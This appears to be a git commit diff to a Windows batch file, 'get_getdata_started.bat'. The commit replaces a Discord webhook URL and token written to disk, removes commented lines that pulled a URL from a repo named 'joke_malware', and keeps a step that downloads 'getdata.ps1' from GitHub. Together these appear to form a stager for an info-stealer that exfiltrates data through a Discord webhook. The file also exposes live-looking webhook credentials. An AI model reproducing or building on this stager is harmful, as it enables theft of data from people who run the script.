b71bf535e75f8f4617fe73abf0d23f4ac6e97023
thompog <thomaseduard@hotmail.com>
2026-05-17 20:43:50 +0200

    Update get_getdata_started.bat

--- get_getdata_started.bat
+++ get_getdata_started.bat
@@ -1,10 +1,5 @@
 @echo off
-::if not exist "%~dp0url.txt" (
-::  curl -L "https://raw.githubusercontent.com/BOBZERO-afk/joke_malware/refs/heads/main/url.txt" -o "url.txt"
-::)
-::for /F %%i in (url.txt) do set url=%%i
-::del url.txt
-echo https://discord.com/api/webhooks/1491073066145677542/NlYoNlDnzPxXh4T3_QzmobOlqGoyw5G3g7HUiaIQa4VL5TM4r2XpyZnZ0Qh4WWocWarz>discord_webhook.txt
+echo https://discord.com/api/webhooks/1505641931126866000/WSFPpjCKn_M3VAiaRCmlNYEnuX8z8OaTjJHKKbcDJ6Y2RB5r08MHjzgquVi5npspZBAa>discord_webhook.txt
 if not exist "%~dp0getdata.ps1" (
   curl -L "https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1" -o "getdata.ps1"
 )
